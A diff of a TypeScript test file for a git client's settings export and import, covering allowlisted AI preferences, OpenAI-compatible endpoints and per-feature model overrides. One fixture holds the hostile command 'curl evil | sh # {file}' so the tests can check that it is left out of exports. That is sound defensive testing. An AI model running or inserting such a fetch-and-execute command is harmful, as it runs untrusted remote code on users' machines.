@@ -64,7 +64,7 @@ describe('buildSettingsExport / the allowlist', () => {
   it('portable preferences carry only the allowlisted ai fields (never the custom agent command)', () => {
     const settings: AppSettings = { ...DEFAULT_SETTINGS, ai: { ...DEFAULT_SETTINGS.ai, hasApiKey: true, claudeCliPath: '/bin/claude', provider: 'claude-cli', model: 'x', effort: 'max', agentCommand: 'custom', agentCustomCommand: 'curl evil | sh # {file}' } };
     const prefs = buildPortablePreferences(settings);
-    expect(prefs.ai).toEqual({ provider: 'claude-cli', model: 'x', effort: 'max', autoStageAfterResolve: settings.ai.autoStageAfterResolve, reviewStrictness: settings.ai.reviewStrictness, reviewMaxFiles: settings.ai.reviewMaxFiles, reviewPostFooter: settings.ai.reviewPostFooter, agentCommand: 'custom' });
+    expect(prefs.ai).toEqual({ provider: 'claude-cli', model: 'x', openaiBaseUrl: '', openaiModel: '', featureModels: {}, effort: 'max', autoStageAfterResolve: settings.ai.autoStageAfterResolve, reviewStrictness: settings.ai.reviewStrictness, reviewMaxFiles: settings.ai.reviewMaxFiles, reviewPostFooter: settings.ai.reviewPostFooter, agentCommand: 'custom' });
     expect(JSON.stringify(buildSettingsExport({ sections: ['preferences'], settings, repositories: [], appVersion: '1', platform: 'linux' }))).not.toContain('evil');
   });
 
@@ -302,5 +302,37 @@ describe('stableHash', () => {
   it('is deterministic and sensitive to content', () => {
     expect(stableHash('a')).toBe(stableHash('a'));
     expect(stableHash('a')).not.toBe(stableHash('b'));
+  });
+});
+
+describe('OpenAI-compatible and per-feature model settings', () => {
+  const file = (ai: unknown) => validateSettingsExport({ schema: 1, app: 'gitgood', version: '1', exportedAt: 'x', platform: 'linux', preferences: { ai } });
+
+  it('exports the base URL, model and feature overrides but never an API key', () => {
+    const settings: AppSettings = { ...DEFAULT_SETTINGS, ai: { ...DEFAULT_SETTINGS.ai, provider: 'openai-compatible', openaiBaseUrl: 'http://localhost:11434/v1', openaiModel: 'llama3.1', hasOpenaiApiKey: true, featureModels: { review: 'big', commitMessage: 'small' } } };
+    const ai = buildPortablePreferences(settings).ai;
+    expect(ai).toMatchObject({ provider: 'openai-compatible', openaiBaseUrl: 'http://localhost:11434/v1', openaiModel: 'llama3.1', featureModels: { review: 'big', commitMessage: 'small' } });
+    expect(JSON.stringify(ai)).not.toMatch(/apikey/i);
+  });
+
+  it('keeps only known features with non-empty string models on import', () => {
+    const result = file({ featureModels: { review: ' m1 ', bogus: 'x', explain: '', split: 7, constructor: 'y' } });
+    expect(result.ok).toBe(true);
+    if (result.ok) expect(result.data.preferences?.ai?.featureModels).toEqual({ review: 'm1' });
+  });
+
+  it('rejects a non-object featureModels and an unknown provider', () => {
+    const result = file({ featureModels: ['a'], provider: 'evil' });
+    expect(result.ok).toBe(true);
+    if (result.ok) {
+      expect(result.data.preferences?.ai).toBeUndefined();
+      expect(result.warnings.length).toBeGreaterThanOrEqual(2);
+    }
+  });
+
+  it('replace-import resets feature overrides absent from the file', () => {
+    const current: AppSettings = { ...DEFAULT_SETTINGS, ai: { ...DEFAULT_SETTINGS.ai, featureModels: { review: 'mine' } } };
+    const patch = buildPreferencesPatch(current, { ai: { provider: 'anthropic' } } as never, 'replace');
+    expect(patch.ai?.featureModels).toEqual({});
   });
 });
